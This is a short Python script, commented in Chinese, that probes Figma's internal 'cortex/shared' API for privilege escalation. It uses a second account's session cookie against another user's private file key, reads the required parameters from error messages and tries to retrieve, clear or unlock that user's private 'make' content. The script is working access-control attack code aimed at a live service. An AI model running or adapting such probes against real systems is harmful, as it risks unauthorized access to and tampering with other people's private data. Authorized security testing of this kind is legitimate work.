# -*- coding: utf-8 -*-
"""cortex/shared 接口参数契约反推 + 越权探测 (B 对 A 私有 make 文件, 无 fuid 注入)
技巧: 发空 body → 400 错误提示缺哪个字段 → 补字段 → 看权限判定
"""
import io, json, sys, urllib.error, urllib.parse, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
KEY = "5zb5YkoxMa09KpqOyuLcHD"   # A 的 make 文件(私有)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
BC = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')

ENDPOINTS = [
    ("retrieve_in_progress_make", "POST", "/api/cortex/shared/retrieve_in_progress_make"),
    ("clear_in_progress_make", "POST", "/api/cortex/shared/clear_in_progress_make"),
    ("release_resumable_make_lock", "POST", "/api/cortex/shared/release_resumable_make_lock"),
    ("heartbeat_resumable_make_lock", "POST", "/api/cortex/shared/heartbeat_resumable_make_lock"),
    ("figmake_request_lock", "POST", "/api/cortex/shared/figmake_request_lock"),
    ("autosuggest_text", "POST", "/api/cortex/shared/autosuggest_text"),
    ("adjust_text", "POST", "/api/cortex/shared/adjust_text"),
    ("retrieve_in_progress_make2", "GET", "/api/cortex/shared/retrieve_in_progress_make"),
]


def call(label, method, path, body=None):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/make/" + KEY, "Cookie": BC,
               "X-Figma-File-Key": KEY}
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} {raw[:300]}")
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} {raw[:300]}")


print("======== 空 body 探测 (反推参数契约) ========")
for label, m, p in ENDPOINTS:
    call(label, m, p)

print("\n======== 带 file_key 试探 ========")
for label, m, p in ENDPOINTS[:3]:
    call(label + " +file_key", m, p, {"file_key": KEY})
    call(label + " +file_id", m, p, {"file_id": "2386353361958857999"})
